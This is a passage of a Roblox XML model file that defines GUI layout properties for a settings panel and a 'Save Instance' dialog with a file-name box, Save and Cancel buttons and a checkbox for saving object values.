							<float name="BackgroundTransparency">0</float>
							<Color3 name="BorderColor3">4287993237</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">Header</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>17</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
						<Item class="TextLabel" referent="RBXDCA070B4F1B142619D0947CE5CE23EB0">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">5</token>
								<string name="Name">TextLabel</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>4</XO>
									<YS>0</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>-4</XO>
									<YS>1</YS>
									<YO>0</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<string name="Text">Settings</string>
								<Color3 name="TextColor3">4278190080</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">14</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">0</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
					</Item>
					<Item class="BindableFunction" referent="RBXDA82289576DC40859366C961A5C4C9E4">
						<Properties>
							<string name="Name">GetSetting</string>
						</Properties>
					</Item>
					<Item class="Frame" referent="RBX81A85B94969F4A119EC531607318F0C0">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">SettingTemplate</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>18</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>60</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">false</bool>
							<int name="ZIndex">1</int>
						</Properties>
						<Item class="TextLabel" referent="RBX91C1AD74481C4F9E81E431EFE8F56A68">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">6</token>
								<string name="Name">SName</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>10</XO>
									<YS>0</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>-20</XO>
									<YS>0</YS>
									<YO>30</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<string name="Text">SettingName</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">18</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">0</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
						<Item class="TextLabel" referent="RBX6339F884D3D64C8FA02B9650F3C9E80C">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">6</token>
								<string name="Name">Status</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>60</XO>
									<YS>0</YS>
									<YO>30</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>50</XO>
									<YS>0</YS>
									<YO>15</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<string name="Text">Off</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">18</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">0</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
						<Item class="TextButton" referent="RBXCB6D6A0376D3401F9BB3E86F07B1C51F">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<bool name="AutoButtonColor">true</bool>
								<Color3 name="BackgroundColor3">4292664540</Color3>
								<float name="BackgroundTransparency">0</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">5</token>
								<bool name="Modal">false</bool>
								<string name="Name">Change</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>10</XO>
									<YS>0</YS>
									<YO>30</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">true</bool>
								<bool name="Selected">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>40</XO>
									<YS>0</YS>
									<YO>15</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<string name="Text"></string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">14</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="TextLabel" referent="RBX61B454E0F56241A58544CF0BAB861789">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278227932</Color3>
									<float name="BackgroundTransparency">0</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">5</token>
									<string name="Name">OnBar</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>15</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text"></string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">14</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="TextLabel" referent="RBX363587EC97E04A699742EAF8E79C2442">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">0</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">true</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">5</token>
									<string name="Name">Bar</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>-2</XO>
										<YS>0</YS>
										<YO>-2</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>19</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text"></string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">14</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
						</Item>
					</Item>
					<Item class="Frame" referent="RBXCBDAD6383C8E4628A7291F72F828E3E6">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">SettingList</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>17</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>1</YS>
								<YO>-17</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
					</Item>
				</Item>
				<Item class="Frame" referent="RBX64B256AB889B475A9CBD2E915BA53A31">
					<Properties>
						<bool name="Active">true</bool>
						<Vector2 name="AnchorPoint">
							<X>0</X>
							<Y>0</Y>
						</Vector2>
						<Color3 name="BackgroundColor3">4293519849</Color3>
						<float name="BackgroundTransparency">0</float>
						<Color3 name="BorderColor3">4287993237</Color3>
						<int name="BorderSizePixel">1</int>
						<bool name="ClipsDescendants">false</bool>
						<bool name="Draggable">true</bool>
						<string name="Name">SaveInstance</string>
						<Ref name="NextSelectionDown">null</Ref>
						<Ref name="NextSelectionLeft">null</Ref>
						<Ref name="NextSelectionRight">null</Ref>
						<Ref name="NextSelectionUp">null</Ref>
						<UDim2 name="Position">
							<XS>0.300000012</XS>
							<XO>0</XO>
							<YS>0.300000012</YS>
							<YO>0</YO>
						</UDim2>
						<float name="Rotation">0</float>
						<bool name="Selectable">false</bool>
						<Ref name="SelectionImageObject">null</Ref>
						<UDim2 name="Size">
							<XS>0</XS>
							<XO>350</XO>
							<YS>0</YS>
							<YO>20</YO>
						</UDim2>
						<token name="SizeConstraint">0</token>
						<token name="Style">0</token>
						<bool name="Visible">false</bool>
						<int name="ZIndex">2</int>
					</Properties>
					<Item class="TextLabel" referent="RBX5214B91B40904C9AB1FD5F7965264A93">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4288914085</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">3</token>
							<token name="FontSize">5</token>
							<string name="Name">Title</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>1</YS>
								<YO>0</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<string name="Text">Save Instance</string>
							<Color3 name="TextColor3">4278190080</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">14</float>
							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">0</float>
							<bool name="TextWrapped">false</bool>
							<token name="TextXAlignment">0</token>
							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">2</int>
						</Properties>
					</Item>
					<Item class="Frame" referent="RBX7EC0E10ACDFD46F1AC23C1EDD6A3D6B7">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">0.100000001</float>
							<Color3 name="BorderColor3">4290756543</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">MainWindow</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>200</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
						<Item class="TextButton" referent="RBX83CA6815C6434EE886DF0F3CCB9AAB74">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<bool name="AutoButtonColor">true</bool>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">0.5</float>
								<Color3 name="BorderColor3">4278190080</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">6</token>
								<bool name="Modal">false</bool>
								<string name="Name">Save</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0.075000003</XS>
									<XO>0</XO>
									<YS>1</YS>
									<YO>-40</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">true</bool>
								<bool name="Selected">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0.400000006</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>30</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<string name="Text">Save</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">18</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
						<Item class="TextLabel" referent="RBXBEE1676DA295433187BF5F7B5FB616B0">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">5</token>
								<string name="Name">Desc</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>40</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<string name="Text">This will save an instance to your PC. Type in the name for your instance. (.rbxmx will be added automatically.)</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">14</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">true</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
						<Item class="TextButton" referent="RBXBF5DC84E1B5840F18704E197EC7F5269">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<bool name="AutoButtonColor">true</bool>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">0.5</float>
								<Color3 name="BorderColor3">4278190080</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">6</token>
								<bool name="Modal">false</bool>
								<string name="Name">Cancel</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0.524999976</XS>
									<XO>0</XO>
									<YS>1</YS>
									<YO>-40</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">true</bool>
								<bool name="Selected">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0.400000006</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>30</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<string name="Text">Cancel</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">18</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
						<Item class="TextBox" referent="RBXC2D764DAB4554897BF8A828962F037A0">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">0.200000003</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClearTextOnFocus">true</bool>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">6</token>
								<bool name="MultiLine">false</bool>
								<string name="Name">FileName</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0.075000003</XS>
									<XO>0</XO>
									<YS>0.400000006</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">true</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<bool name="ShowNativeInput">true</bool>
								<UDim2 name="Size">
									<XS>0.850000024</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>30</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<string name="Text"></string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">18</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">0</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
						<Item class="TextButton" referent="RBX373428E5D7B3480CA97B07AA31A29A8D">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<bool name="AutoButtonColor">true</bool>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">0.600000024</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">6</token>
								<bool name="Modal">false</bool>
								<string name="Name">SaveObjects</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0.075000003</XS>
									<XO>0</XO>
									<YS>0.625</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">true</bool>
								<bool name="Selected">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>20</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<string name="Text"></string>
								<Color3 name="TextColor3">4294967295</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">18</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">2</int>
							</Properties>
							<Item class="TextLabel" referent="RBX246CE13FA4B449A89BD0E77C87A85DFA">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4284572001</Color3>
									<float name="BackgroundTransparency">0.400000006</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">5</token>
									<string name="Name">enabled</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>3</XO>
										<YS>0</YS>
										<YO>3</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>14</XO>
										<YS>0</YS>
										<YO>14</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text"></string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">14</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
						</Item>
						<Item class="TextLabel" referent="RBXDA44D76391154C6DA211E8B658F5D7B0">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">5</token>
								<string name="Name">Desc2</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0.075000003</XS>
									<XO>30</XO>
									<YS>0.625</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0.925000012</XS>
									<XO>-30</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<string name="Text">Save &quot;Object&quot; type values</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">14</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">0</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
					</Item>
				</Item>
				<Item class="Frame" referent="RBX7EAA1A174F80452E81887608C3F0D553">
					<Properties>
						<bool name="Active">true</bool>
						<Vector2 name="AnchorPoint">
							<X>0</X>
							<Y>0</Y>
						</Vector2>
						<Color3 name="BackgroundColor3">4293519849</Color3>
